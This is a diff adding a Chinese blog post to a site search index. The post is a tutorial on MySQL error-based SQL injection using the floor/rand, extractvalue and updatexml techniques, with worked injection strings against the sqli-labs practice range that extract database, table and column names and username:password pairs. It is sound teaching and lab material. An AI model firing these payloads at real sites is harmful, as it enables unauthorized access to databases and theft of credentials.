@@ -1,6 +1,128 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>基于报错注入</title>
+    <url>/2019/10/20/%E5%9F%BA%E4%BA%8E%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<p><strong>适用场景：页面返回错误连接信息</strong></p>
+<h2 id="floor报错注入"><a href="#floor报错注入" class="headerlink" title="floor报错注入"></a>floor报错注入</h2><p><strong>floor()函数，去除小数部分，向下取整</strong></p>
+<p><strong>rand()函数,产生0~1的随机数</strong></p>
+<p><strong>rand(x)：x对应一个固定的值，但连续多次执行会变化。</strong></p>
+<p><strong>floor(rand(0)*2)产生的序列为011011。</strong></p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>​        <em>利用数据库主键不能重复的原理，使用group by分组，产生主键冗余，导致报错</em></p>
+<pre><code>select count(), floor(rand(0)*2) as a from information_schema.tables group by a;</code></pre><p><em>这里的group by直接与floor(rand(0)*2)连接，由于floor(rand(0)*2)产生的随机序列为011011，下面就是数据库内的运算</em></p>
+<p><em>首先建立一张虚拟表：</em></p>
+<table>
+<thead>
+<tr>
+<th align="center">key</th>
+<th align="center">count(*)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"></td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center"></td>
+</tr>
+</tbody></table>
+<p><em>接着进行group by floor(rand(0)*2)。floor表达式第一次运算的值为0，在表中没有找到key为0的数据，故插入，在插入的过程中需要再取一次group by后面的值（即再进行一次floor运算，结果为1），取到了1，将之插入，并将count(\</em>)置1。*</p>
+<table>
+<thead>
+<tr>
+<th align="center">key</th>
+<th align="center">count(*)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">1</td>
+<td align="center">1</td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center"></td>
+</tr>
+</tbody></table>
+<p><em>继续进行group by floor(rand(0)*2),由于这是第三次运算，所以floor(rand(0)*2)的值为1，刚好表中已有key为1的数据，所以直接在count(\</em>)处加上1即可。*</p>
+<table>
+<thead>
+<tr>
+<th align="center">key</th>
+<th align="center">count(*)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">1</td>
+<td align="center">2</td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center"></td>
+</tr>
+</tbody></table>
+<p><em>继续进行group by floor(rand(0)*2)的操作，现在已经是第四次floor运算，所以现在值为0，继续在表中找key为0的数据，发现没有这个数据，所以应当插入一条新的数据，此时重复第一次group by，这时的key值为1,并将count(\</em>)的值设为1。可是表中现在已经存在key为1的数据，故此时抛出主键冗余的异常。*</p>
+<h3 id="靶场演示"><a href="#靶场演示" class="headerlink" title="靶场演示"></a>靶场演示</h3><p><em>（sqlilabs靶场第1关）</em></p>
+<p><em>爆库：</em></p>
+<pre><code>id=1&#39; and (select 1 from (select count(*),concat(0x23,database(),0x23,floor(rand(0)*2)) as x from information_schema.tables group by x) as a)--+</code></pre><p><img src="C:%5CUsers%5C123%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1571540074900.png" alt="1571540074900"></p>
+<p><em>爆表：</em></p>
+<pre><code>id=1&#39; and (select 1 from (select count(*),concat(0x23,(select concat(table_name) from information_schema.tables where table_schema=database() limit 3,1),0x23,floor(rand(0)*2)) as x from
+information_schema.tables group by x) as a)--+</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571540382.23.png" alt=""></p>
+<p><em>爆列名：</em></p>
+<pre><code>id=1&#39; and (select 1 from (select count(*),concat(0x23,(select concat(column_name) from information_schema.columns where table_name=&#39;users&#39; limit 1,1),0x23,floor(rand(0)*2)) as x from
+information_schema.tables group by x) as a)--+</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571540628.93.png" alt=""></p>
+<p><em>爆字段：</em></p>
+<pre><code>id=1&#39; and (select 1 from (select count(*),concat(0x23,(select concat(username,&#39;:&#39;,password) from security.users limit 0,1),0x23,floor(rand(0)*2)) as x from information_schema.tables group by x) as a)--+</code></pre><p><img src="C:%5CUsers%5C123%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1571540743913.png" alt="1571540743913"></p>
+<h2 id="Extractvalue报错注入"><a href="#Extractvalue报错注入" class="headerlink" title="Extractvalue报错注入"></a>Extractvalue报错注入</h2><p><strong>Extractvalue(xml_frag,xpath_expr)函数使用XPath表示法从XML字符串中提取值</strong></p>
+<p>​        <strong>xml_frag:目标xml文档</strong></p>
+<p>​        <strong>xpath_expr:利用xpath路径法表示的查找路径</strong></p>
+<h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>​        <em>xpath格式语法书写错误会报错</em></p>
+<pre><code>SELECT extractvalue(&#39;&lt;a&gt;&lt;b&gt;text1&lt;/b&gt;&lt;b&gt;text2&lt;/b&gt;&lt;/a&gt;&#39;,&#39;/a/b&#39;) as result;</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571541686.75.png" alt=""></p>
+<pre><code>SELECT extractvalue(&#39;&lt;a&gt;&lt;b&gt;text1&lt;/b&gt;&lt;b&gt;text2&lt;/b&gt;&lt;/a&gt;&#39;,&#39;database()&#39;) as result;</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571541929.49.png" alt=""></p>
+<h3 id="靶场演示-1"><a href="#靶场演示-1" class="headerlink" title="靶场演示"></a>靶场演示</h3><p><em>（sqlilabs靶场第1关）</em></p>
+<p><em>爆库：</em></p>
+<pre><code>id=1&#39; and extractvalue(1,concat_ws(0x23,user(),version(),database(),@@version_compile_os))--+</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571542339.7.png" alt=""></p>
+<p><em>爆表：</em></p>
+<pre><code>id=1&#39; and extractvalue(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema=database())))--+</code></pre><p><img src="C:%5CUsers%5C123%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1571542436964.png" alt="1571542436964"></p>
+<p><em>爆列：</em></p>
+<pre><code>id=1&#39; and extractvalue(1,concat(0x23,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;)))--+</code></pre><p><img src="C:%5CUsers%5C123%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1571543826518.png" alt="1571543826518"></p>
+<p><em>爆字段：</em></p>
+<pre><code>id=1&#39; and extractvalue(1,(select group_concat(username,&#39;:&#39;,password) from users))--+</code></pre><p><img src="C:%5CUsers%5C123%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1571543917259.png" alt="1571543917259"></p>
+<h2 id="updatexml报错注入"><a href="#updatexml报错注入" class="headerlink" title="updatexml报错注入"></a>updatexml报错注入</h2><p><strong>updatexml(XML_document,XPath_String,new_value)函数，返回替换的xml片段</strong></p>
+<p>​        <strong>XML_document：XML文档的名称，为string格式</strong></p>
+<p>​        <strong>XPath_String：XPath格式的字符串</strong></p>
+<p>​        <strong>new_value：替换查找到的符合条件的数据，为string格式</strong></p>
+<h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>​        <em>同extractvalue报错一样，构造错误的Xpath,以达到报错注入</em></p>
+<h3 id="靶场演示-2"><a href="#靶场演示-2" class="headerlink" title="靶场演示"></a>靶场演示</h3><p><em>（sqlilabs靶场第1关）</em></p>
+<p><em>爆库：</em></p>
+<pre><code>id=1&#39; and updatexml(1,concat(0x23,version(),user()),1)--+</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571544448.8.png" alt=""></p>
+<p><em>爆表：</em></p>
+<pre><code>id=1&#39; and updatexml(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)--+</code></pre><p><img src="C:%5CUsers%5C123%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1571544555174.png" alt="1571544555174"></p>
+<p><em>爆列：</em></p>
+<pre><code>id=1&#39; and updatexml(1,concat(0x23,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;)),1)--+</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571544642.63.png" alt=""></p>
+<p><em>爆字段：</em></p>
+<pre><code>id=1&#39; and updatexml(1,concat(0x23,(select group_concat(username,0x23,password) from security.users)),1)--+</code></pre><p><img src="C:%5CUsers%5C123%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1571544707490.png" alt="1571544707490"></p>
+]]></content>
+      <categories>
+        <category>web安全 - SQL注入</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HTTP攻击</title>
     <url>/2019/10/19/HTTP%E6%94%BB%E5%87%BB/</url>
     <content><![CDATA[<p>HTTP基础：</p>
